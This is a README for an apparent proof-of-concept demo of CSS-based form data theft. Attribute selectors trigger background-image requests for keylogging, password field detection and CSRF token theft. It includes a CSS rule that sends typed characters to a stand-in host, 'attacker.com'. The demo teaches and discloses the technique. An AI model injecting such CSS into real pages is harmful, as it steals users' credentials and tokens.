# CSS Cache Thief

Proof of concept showing how CSS can steal form data.

![CSS Cache Thief Demo](docs/ezgif-6ea37f49458c72c3.gif)

## What it does

Uses CSS attribute selectors to match input values and trigger background-image requests. Every character you type in a form field generates a request that reveals the character. No JavaScript needed for the exfiltration itself.

The demo shows five attack vectors:

- Character keylogging via `input[value*="x"]`
- Password field detection using `:has()`
- CSRF token theft from meta tags
- Focus tracking on form fields
- Form submission detection

## How to run

Open src/index.html in any browser. Type in the form fields and watch the log panel fill with stolen data.

Try it yourself. Type in the username field first. Watch the log. Now type in the password field. Notice the difference in the log output. Password characters are flagged separately.

## How it works

The browser makes HTTP requests for background images. Each request includes the matched character in the URL parameters. A remote server can reconstruct the full input value from the request sequence.

The `:has()` selector detects parent elements containing specific child patterns. This lets the attack identify password fields and forms.

The attack uses CSS like this:

```css
input[value*="a"] {
    background-image: url('https://attacker.com/log?char=a');
}
